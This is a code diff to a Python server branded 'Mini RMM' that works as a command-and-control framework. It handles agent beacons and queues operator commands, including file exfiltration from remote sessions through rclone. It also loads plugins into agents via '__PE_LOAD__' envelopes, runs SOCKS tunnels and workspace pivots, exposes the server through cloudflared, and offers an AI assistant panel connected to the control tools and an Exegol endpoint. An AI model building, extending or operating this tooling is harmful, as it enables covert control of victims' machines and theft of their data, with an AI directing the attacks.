                 self._json(409, {"error": "workspace_pivot_inactive"})
                 return True
             self._json(200, {"ok": True, "session_id": session.id, "channel": channel})
+            return True
+
+        if parts == ["workspace", "assets", "plugins"]:
+            if not workspace_id:
+                self._json(403, {"error": "workspace_auth_required"})
+                return True
+            name = str(body.get("name") or "").strip()
+            if not PLUGIN_NAME_RE.fullmatch(name) or os.path.splitext(name)[1].lower() not in PLUGIN_ARTIFACT_EXTENSIONS:
+                self._json(400, {"error": "invalid_plugin_name"})
+                return True
+            target = _workspace_plugin_path(workspace_id, name)
+            if not target:
+                self._json(400, {"error": "invalid_plugin_path"})
+                return True
+            enabled = bool(body.get("enabled", True))
+            if not enabled:
+                try:
+                    if os.path.isfile(target):
+                        os.unlink(target)
+                except OSError as exc:
+                    self._json(500, {"error": "plugin_cache_remove_failed", "detail": str(exc)})
+                    return True
+                self._json(200, {"ok": True, "name": name, "enabled": False})
+                return True
+            try:
+                content = base64.b64decode(str(body.get("content_b64") or ""), validate=True)
+            except (ValueError, TypeError):
+                self._json(400, {"error": "invalid_plugin_content"})
+                return True
+            if not content or len(content) > MAX_BODY_BYTES:
+                self._json(413, {"error": "plugin_too_large"})
+                return True
+            expected = str(body.get("sha256") or "").strip().lower()
+            actual = hashlib.sha256(content).hexdigest()
+            if expected and expected != actual:
+                self._json(400, {"error": "plugin_checksum_mismatch"})
+                return True
+            write_atomic_bytes(target, content)
+            self._json(200, {"ok": True, "name": name, "size": len(content), "sha256": actual})
+            return True
+
+        if parts == ["profile"]:
+            try:
+                if body.get("stop"):
+                    stopped = srv.stop_profile()
+                    self._json(200, {"ok": True, "stopped": stopped, "profile": srv.profile_status()})
+                else:
+                    config = body.get("config") if isinstance(body.get("config"), dict) else {}
+                    status = srv.start_profile(body.get("name"), config=config)
+                    self._json(200, {"ok": True, "profile": status})
+            except ProfileError as exc:
+                self._json(503, {"error": "profile_start_failed", "detail": str(exc), "profile": srv.profile_status()})
+            return True
+
+        asset_kind = None
+        if len(parts) == 2 and parts[0] == "assets":
+            asset_kind = parts[1]
+        elif parts == ["plugins"]:
+            asset_kind = "plugins"
+        elif parts == ["ai", "skills"]:
+            asset_kind = "skills"
+        elif parts == ["rclone", "profiles"]:
+            asset_kind = "rclone"
+        if asset_kind:
+            url = str(body.get("url") or "").strip()
+            if not url:
+                self._json(400, {"error": "missing_url"})
+                return True
+            try:
+                row = asset_store().add_url(
+                    asset_kind,
+                    url,
+                    name=str(body.get("name") or "").strip(),
+                    enabled=bool(body.get("enabled", True)),
+                )
+                if asset_kind == "plugins":
+                    content = asset_store().read("plugins", row["name"], enabled_only=False)
+                    write_atomic_bytes(safe_join_under(plugin_directory(), row["name"]), content)
+            except AssetError as exc:
+                self._json(400, {"error": str(exc)})
+                return True
+            self._json(201, {"ok": True, "asset": row, "workspace_local": False})
             return True
 
         if parts == ["agent", "go", "build"]:
@@ -3349,16 +3658,37 @@ class RMMHandler(BaseHTTPRequestHandler):
             if not remote_path:
                 self._json(400, {"error": "missing_remote_path"})
                 return True
-            profile = (body.get("profile") or DEFAULT_PROFILE).strip()
+            profile = (body.get("profile") or get_rclone_default_profile()).strip()
             dest = (body.get("dest") or "").strip() or None
             mode = (body.get("mode") or "auto").strip().lower()
+            workspace_job = body.get("workspace_job")
             try:
-                cmd = srv.queue_agent_exfil(session, remote_path, profile, dest=dest, mode=mode)
+                cmd = srv.queue_agent_exfil(
+                    session,
+                    remote_path,
+                    profile,
+                    dest=dest,
+                    mode=mode,
+                    workspace_job=workspace_job,
+                )
             except (ValueError, RcloneConfigError) as e:
-                self._json(503, {"error": str(e), "rclone": rclone_public_config()})
+                rclone_status = (
+                    {"workspace_local": True}
+                    if srv.storage_mode == "workspace"
+                    else rclone_public_config()
+                )
+                self._json(503, {"error": str(e), "rclone": rclone_status})
                 return True
             execution_mode = "plugin" if cmd.startswith("__PE_LOAD__ ") else "binary"
             srv.record_operator_action(session, f"exfil {remote_path}", "exfil", f"mode={execution_mode}")
+            max_bytes = get_rclone_max_bytes()
+            if isinstance(workspace_job, dict) and workspace_job.get("max_bytes") is not None:
+                max_bytes = workspace_job.get("max_bytes")
+            rclone_status = (
+                {"workspace_local": True}
+                if srv.storage_mode == "workspace"
+                else rclone_public_config()
+            )
             self._json(
                 200,
                 {
@@ -3368,8 +3698,8 @@ class RMMHandler(BaseHTTPRequestHandler):
                     "profile": profile,
                     "mode": mode,
                     "execution_mode": execution_mode,
-                    "max_bytes": get_rclone_max_bytes(),
-                    "rclone": rclone_public_config(),
+                    "max_bytes": max_bytes,
+                    "rclone": rclone_status,
                 },
             )
             return True
@@ -3400,34 +3730,28 @@ class RMMHandler(BaseHTTPRequestHandler):
             if not PLUGIN_EXPORT_RE.match(export):
                 self._json(400, {"error": "invalid_export"})
                 return True
+            plugin_command = str(body.get("command", "")).strip()
+            if plugin_command and not PLUGIN_COMMAND_RE.fullmatch(plugin_command):
+                self._json(400, {"error": "invalid_plugin_command"})
+                return True
             plugin_input = str(body.get("input", ""))
             if "\r" in plugin_input or "\n" in plugin_input:
                 self._json(400, {"error": "invalid_input"})
                 return True
-            plugin_input = plugin_input[:4096]
-            command = f"__PE_LOAD__ {plugin} {export}"
+            # The command envelope adds a small JSON wrapper before the
+            # agent frames the input for the plugin child.
+            plugin_input = plugin_input[:4000 if plugin_command else 4096]
+            if plugin_command:
+                # The agent always invokes the stable Run ABI for a command
+                # namespace. The plugin owns command dispatch and validation.
+                command = f"__PLUGIN_COMMAND__ {plugin} {plugin_command}"
+            else:
+                command = f"__PE_LOAD__ {plugin} {export}"
             if plugin_input:
                 command += " " + plugin_input
             srv.set_command(session.id, command, "oneshot")
             srv.record_operator_action(session, command, "pe")
             self._json(200, {"ok": True, "session_id": session.id, "queued": command})
-            return True
-
-        if parts == ["plugins", "build"]:
-            name = str(body.get("name", "")).strip()
-            if not name:
-                self._json(400, {"error": "missing_name"})
-                return True
-            output = str(body.get("output", "") or "").strip()
-            try:
-                result = build_plugin(name, output or None)
-            except ValueError as exc:
-                self._json(400, {"error": "invalid_plugin_build", "detail": str(exc)})
-                return True
-            except RuntimeError as exc:
-                self._json(503, {"error": "plugin_build_failed", "detail": str(exc)})
-                return True
-            self._json(200, result)
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "socks":
@@ -3532,6 +3856,18 @@ class RMMHandler(BaseHTTPRequestHandler):
             if skill_ids is not None and not isinstance(skill_ids, list):
                 self._json(400, {"error": "invalid_skill_ids"})
                 return True
+            skill_documents = body.get("skill_documents")
+            if skill_documents is not None and not isinstance(skill_documents, list):
+                self._json(400, {"error": "invalid_skill_documents"})
+                return True
+            if skill_documents is None:
+                from rmm_ai_skills import ai_skills_dir, resolve_ai_skills
+
+                skill_documents = resolve_ai_skills(
+                    skill_ids,
+                    srv.skill_directories() if hasattr(srv, "skill_directories") else [ai_skills_dir()],
+                    srv.skill_overrides() if hasattr(srv, "skill_overrides") else None,
+                )
             workspace_id = getattr(self, "_workspace_scope", lambda: None)()
             workspace_token = self.headers.get("X-RMM-Workspace-Token", "").strip() if workspace_id else ""
             rmm_headers = {}
@@ -3563,6 +3899,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                     exegol_mcp_url=body.get("exegol_mcp_url"),
                     exegol_mcp_token=body.get("exegol_mcp_token"),
                     skill_ids=skill_ids,
+                    skill_documents=skill_documents,
                 )
                 if result.get("ok") and selected:
                     stored = list(messages)
@@ -3601,7 +3938,8 @@ class RMMHandler(BaseHTTPRequestHandler):
             host = "127.0.0.1"
         elif host == "::1":
             host = "127.0.0.1"
-        return f"http://{host}:{PORT}"
+        port = getattr(self.server_instance, "admin_port", ADMIN_PORT)
+        return f"http://{host}:{port}"
 
     def _handle_api_patch(self, path, body):
         if not self._api_authorized():
@@ -3633,6 +3971,20 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self._json(200, {"ok": True, "session": session.to_dict()})
             else:
                 self._json(404, {"error": "session_not_found"})
+            return True
+
+        if len(parts) == 3 and parts[0] == "assets":
+            try:
+                kind = parts[1]
+                name = urllib.parse.unquote(parts[2])
+                if kind in {"skills", "skill"} and not os.path.splitext(name)[1]:
+                    row = asset_store().set_flag(kind, name, bool(body.get("enabled")))
+                else:
+                    row = asset_store().set_enabled(kind, name, bool(body.get("enabled")))
+            except AssetError as exc:
+                self._json(404, {"error": str(exc)})
+                return True
+            self._json(200, {"ok": True, "asset": row, "workspace_local": False})
             return True
 
         self._json(404, {"error": "not_found"})
@@ -3688,6 +4040,23 @@ class RMMHandler(BaseHTTPRequestHandler):
             self._json(200, body)
             return True
 
+        if len(parts) == 3 and parts[0] == "assets":
+            kind, name = parts[1], urllib.parse.unquote(parts[2])
+            try:
+                removed = asset_store().remove(kind, name)
+                if kind == "plugins":
+                    path = safe_join_under(plugin_directory(), name)
+                    if os.path.isfile(path):
+                        os.unlink(path)
+            except (AssetError, ValueError, OSError) as exc:
+                self._json(404, {"error": "asset_not_found", "detail": str(exc)})
+                return True
+            if not removed:
+                self._json(404, {"error": "asset_not_found"})
+                return True
+            self._json(200, {"ok": True, "kind": kind, "name": name})
+            return True
+
         self._json(404, {"error": "not_found"})
         return True
     
@@ -3695,6 +4064,10 @@ class RMMHandler(BaseHTTPRequestHandler):
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
         qs = urllib.parse.parse_qs(parsed.query)
+
+        if not self._path_allowed(path, method="GET"):
+            self._respond(404, "Not Found")
+            return
 
         if path == f"{API_PREFIX}/ws":
             if self._handle_websocket_upgrade(qs):
@@ -3851,6 +4224,10 @@ class RMMHandler(BaseHTTPRequestHandler):
         path = parsed.path
         qs = urllib.parse.parse_qs(parsed.query)
 
+        if not self._path_allowed(path, method="POST"):
+            self._respond(404, "Not Found")
+            return
+
         if path.startswith(API_PREFIX):
             try:
                 body = self._read_json_body()
@@ -3922,6 +4299,9 @@ class RMMHandler(BaseHTTPRequestHandler):
     def do_PATCH(self):
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
+        if not self._path_allowed(path, method="PATCH"):
+            self._respond(404, "Not Found")
+            return
         if not path.startswith(API_PREFIX):
             self._respond(404, "Not Found")
             return
@@ -3940,6 +4320,9 @@ class RMMHandler(BaseHTTPRequestHandler):
     def do_DELETE(self):
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
+        if not self._path_allowed(path, method="DELETE"):
+            self._respond(404, "Not Found")
+            return
         if not path.startswith(API_PREFIX):
             self._respond(404, "Not Found")
             return
@@ -4195,7 +4578,7 @@ class CommandInterface:
                         self.server.tty_print(f"{Colors.RED}No active session{Colors.END}")
                     else:
                         filepath = args[0]
-                        profile = args[1] if len(args) > 1 else DEFAULT_PROFILE
+                        profile = args[1] if len(args) > 1 else get_rclone_default_profile()
                         try:
                             self.server.queue_agent_exfil(session, filepath, profile)
                             self.server.tty_print(
@@ -4303,10 +4686,28 @@ class CommandInterface:
         return True
 
 def main():
-    global PORT, API_TOKEN, BEACON_SECRET, INSECURE, LISTEN_HOST
+    global PORT, ADMIN_PORT, BEACON_PORT, API_TOKEN, BEACON_SECRET, INSECURE, LISTEN_HOST, BEACON_BIND
 
     parser = argparse.ArgumentParser(description="Mini RMM HTTP server")
-    parser.add_argument("port", nargs="?", type=int, default=8080, help="Listen port (default: 8080)")
+    parser.add_argument(
+        "port",
+        nargs="?",
+        type=int,
+        default=None,
+        help="Legacy alias for the administration port",
+    )
+    parser.add_argument(
+        "--admin-port",
+        type=int,
+        default=None,
+        help="Operator administration port (env: RMM_ADMIN_PORT; default: 8080)",
+    )
+    parser.add_argument(
+        "--beacon-port",
+        type=int,
+        default=None,
+        help="Agent beacon port (env: RMM_BEACON_PORT; default: admin port + 1)",
+    )
     parser.add_argument(
         "--cli",
         action="store_true",
@@ -4325,7 +4726,17 @@ def main():
     parser.add_argument(
         "--bind",
         default=LISTEN_HOST,
-        help="Listen address (default: 127.0.0.1; use 0.0.0.0 only behind a firewall)",
+        help="Administration listen address (default: 127.0.0.1)",
+    )
+    parser.add_argument(
+        "--beacon-bind",
+        default=BEACON_BIND,
+        help="Beacon listen address (default: same as --bind)",
+    )
+    parser.add_argument(
+        "--profile",
+        default=os.environ.get("RMM_PROFILE_NAME", "cloudflared"),
+        help="RMM-Profile to start when installed (env: RMM_PROFILE_NAME)",
     )
     parser.add_argument(
         "--insecure",
@@ -4346,8 +4757,19 @@ def main():
         help="Max exfil size in bytes (file or folder); 0 = unlimited (or set RMM_RCLONE_MAX_BYTES)",
     )
     args = parser.parse_args()
-    PORT = args.port
+    admin_port = args.admin_port if args.admin_port is not None else args.port
+    if admin_port is None:
+        admin_port = _env_int("RMM_ADMIN_PORT", 8080)
+    beacon_port = args.beacon_port
+    if beacon_port is None:
+        beacon_port = _env_int("RMM_BEACON_PORT", admin_port + 1)
+    if not 1 <= admin_port <= 65535 or not 1 <= beacon_port <= 65535:
+        parser.error("admin and beacon ports must be between 1 and 65535")
+    PORT = admin_port
+    ADMIN_PORT = admin_port
+    BEACON_PORT = beacon_port
     LISTEN_HOST = args.bind
+    BEACON_BIND = args.beacon_bind or LISTEN_HOST
     INSECURE = args.insecure
     if args.token:
         API_TOKEN = args.token.strip()
@@ -4403,26 +4825,58 @@ def main():
     server = RMMServer()
     RMMHandler.server_instance = server
 
-    # ThreadingHTTPServer: beacons (/cmd, /result), operator API, and WebSocket run concurrently.
-    http_server = ThreadingHTTPServer((LISTEN_HOST, PORT), RMMHandler)
-    http_server.daemon_threads = True
+    def make_http_server(bind: str, port: int, role: str):
+        """Bind one role-specific threaded HTTP listener."""
+        handler = type(
+            f"{role.title()}RMMHandler",
+            (RMMHandler,),
+            {"server_instance": server, "listener_role": role},
+        )
+        instance = ThreadingHTTPServer((bind, port), handler)
+        instance.daemon_threads = True
+        instance.listener_role = role
+        instance.server_instance = server
+        return instance
 
-    print(f"{Colors.GREEN}[*] RMM listening on {LISTEN_HOST}:{PORT} (threaded HTTP){Colors.END}")
-    print(f"{Colors.CYAN}[*] Operator API: http://127.0.0.1:{PORT}{API_PREFIX}/{Colors.END}")
-    print(f"{Colors.CYAN}[*] Web UI: http://127.0.0.1:{PORT}/ui/{Colors.END}")
-    print(f"{Colors.CYAN}[*] CLI: python rmm_cli.py --url http://127.0.0.1:{PORT}{Colors.END}")
+    if admin_port == beacon_port and LISTEN_HOST == BEACON_BIND:
+        http_servers = [make_http_server(LISTEN_HOST, admin_port, "combined")]
+    else:
+        http_servers = [
+            make_http_server(LISTEN_HOST, admin_port, "admin"),
+            make_http_server(BEACON_BIND, beacon_port, "beacon"),
+        ]
+    server.set_listener_ports(admin_port, beacon_port)
+
+    print(f"{Colors.GREEN}[*] Administration listener: {LISTEN_HOST}:{admin_port} (threaded HTTP){Colors.END}")
+    print(f"{Colors.GREEN}[*] Beacon listener: {BEACON_BIND}:{beacon_port} (threaded HTTP){Colors.END}")
+    print(f"{Colors.CYAN}[*] Operator API: http://127.0.0.1:{admin_port}{API_PREFIX}/{Colors.END}")
+    print(f"{Colors.CYAN}[*] Web UI: http://127.0.0.1:{admin_port}/ui/{Colors.END}")
+    print(f"{Colors.CYAN}[*] CLI: python rmm_cli.py --url http://127.0.0.1:{admin_port}{Colors.END}")
     print(f"{Colors.CYAN}[*] MCP: python mcp_rmm_server.py (see README){Colors.END}")
     print(f"{Colors.CYAN}[*] Web AI: /ui/ → AI Assistant panel (OpenAI key + RMM tools){Colors.END}")
-    print(f"{Colors.CYAN}[*] Tunnel: cloudflared tunnel --url http://localhost:{PORT}{Colors.END}")
+    print(f"{Colors.CYAN}[*] RMM-Profile directory: {profile_directory()}{Colors.END}")
     print(f"{Colors.YELLOW}[*] Logs: {LOG_DIR}{Colors.END}")
     if API_TOKEN:
         print(f"{Colors.YELLOW}[*] Operator API auth: enabled ({API_PREFIX}/*){Colors.END}")
     if BEACON_SECRET:
         print(f"{Colors.YELLOW}[*] Beacon auth: X-RMM-Beacon-Token required{Colors.END}")
     print()
-    
-    http_thread = threading.Thread(target=http_server.serve_forever, daemon=True)
-    http_thread.start()
+
+    http_threads = [
+        threading.Thread(target=http_server.serve_forever, daemon=True, name=f"rmm-{http_server.listener_role}")
+        for http_server in http_servers
+    ]
+    for http_thread in http_threads:
+        http_thread.start()
+
+    profile_auto_start = os.environ.get("RMM_PROFILE_AUTOSTART", "1").strip().lower() in {"1", "true", "yes"}
+    if profile_auto_start and args.profile and any(row["name"] == args.profile.strip().lower() for row in server.profile_manager.list()):
+        try:
+            server.start_profile(args.profile)
+        except ProfileError as exc:
+            server.log(f"RMM-Profile {args.profile} did not start: {exc}", "WARNING")
+    elif profile_auto_start and args.profile:
+        print(f"{Colors.YELLOW}[*] RMM-Profile {args.profile} is not installed; install it under {profile_directory()}{Colors.END}")
     
     if not args.cli:
         print(f"{Colors.BOLD}[*] Headless mode. Press Ctrl+C to stop.{Colors.END}\n")
@@ -4431,8 +4885,11 @@ def main():
                 time.sleep(1)
         except KeyboardInterrupt:
             print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")
+        server.stop_profile()
         server.tun.stop_all()
-        http_server.shutdown()
+        for http_server in http_servers:
+            http_server.shutdown()
+            http_server.server_close()
         return
 
     cli = CommandInterface(server)
@@ -4456,8 +4913,11 @@ def main():
 
     if not getattr(server, "_cli_use_ptk", False):
         readline.write_history_file(HISTORY_FILE)
+    server.stop_profile()
     server.tun.stop_all()
-    http_server.shutdown()
+    for http_server in http_servers:
+        http_server.shutdown()
+        http_server.server_close()
 
 if __name__ == "__main__":
     main()
